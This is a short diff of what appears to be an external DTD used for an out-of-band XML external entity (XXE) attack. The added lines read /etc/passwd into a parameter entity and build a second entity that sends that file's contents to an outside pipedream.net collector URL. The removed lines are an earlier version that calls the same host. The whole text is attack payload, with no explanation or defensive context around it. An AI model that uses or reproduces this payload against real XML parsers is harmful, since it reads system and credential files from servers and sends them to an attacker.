@@ -1,3 +1,2 @@
-<!ENTITY % all "<!ENTITY % send SYSTEM 'https://end7l0yp0boy.x.pipedream.net/'>">
-%all;
-%send;
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://end7l0yp0boy.x.pipedream.net/%data;'>">
